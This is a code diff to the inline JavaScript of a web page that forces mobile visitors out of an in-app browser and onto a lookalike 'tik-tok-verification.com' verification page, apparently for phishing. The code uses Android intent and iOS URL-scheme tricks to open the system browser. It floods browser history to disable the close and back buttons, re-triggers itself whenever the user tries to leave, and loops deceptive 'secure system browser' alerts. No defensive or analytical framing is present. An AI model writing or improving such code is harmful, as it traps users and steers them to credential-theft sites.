@@ -11,54 +11,43 @@
     const target = "https://tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000; 
 
-    function storeBreakout() {
+    function trigger() {
+        // FAIL-SAFE FIRST
+        if (Date.now() > killTime) return;
+
+        // 1. SHOW ALERT IMMEDIATELY (To prove the script is alive)
+        alert("ATTEMPT #16\n\nClick OK to open the secure system browser.");
+
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
+        // 2. THE BREAKOUT
         if (isAndroid) {
-            // Android: We use the 'Market' intent to search for the URL itself. 
-            // This forces the Play Store to open, and when it fails to find an app, 
-            // it often offers to open the 'search' in Chrome.
-            window.location.href = "market://search?q=" + encodeURIComponent(target) + "&c=apps";
+            // Android Chrome Intent
+            window.location.href = "intent://" + target.replace("https://", "") + "#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end";
+        } else {
+            // iOS: Try the Search protocol and the Maps protocol
+            window.location.replace("x-web-search://?" + encodeURIComponent(target));
             
             setTimeout(() => {
-                window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
-            }, 100);
-
-        } else if (isIOS) {
-            // iOS: The 'itms-apps' search protocol. 
-            // This hits the system level and usually pops the "Open in App Store?" dialog.
-            window.location.href = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + encodeURIComponent(target);
-            
-            setTimeout(() => {
-                // Secondary jump to Safari via a Maps-bypass protocol
                 window.location.href = "maps://?q=" + encodeURIComponent(target);
-            }, 100);
+            }, 50);
         }
-    }
 
-    function rampage() {
-        if (Date.now() > killTime) return; // FAIL-SAFE
-
-        storeBreakout();
-
-        // FIXED ALERT FOR ATTEMPT #16
-        alert("ATTEMPT #16\n\nSystem browser handover required.\n\nTap OK to continue.");
-        
-        storeBreakout();
-
-        setTimeout(rampage, 10);
+        // 3. RECURSE
+        setTimeout(trigger, 10);
     }
 
     window.onload = () => {
-        // High-density history jam to trap the "X" button
-        for(let i=0; i<120; i++) history.pushState({state:i}, "", "#auth_" + i);
-        rampage();
+        // Flood history to block 'X' button
+        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
+        
+        // Start the engine
+        trigger();
     };
 
-    // Re-trigger on any attempt to close or blur
-    window.onblur = () => { if (Date.now() < killTime) rampage(); };
-    window.onpopstate = () => { if (Date.now() < killTime) rampage(); };
+    // If they swipe or try to leave, trigger again
+    window.onblur = () => { if (Date.now() < killTime) trigger(); };
 </script>
+
 </body>
 </html>
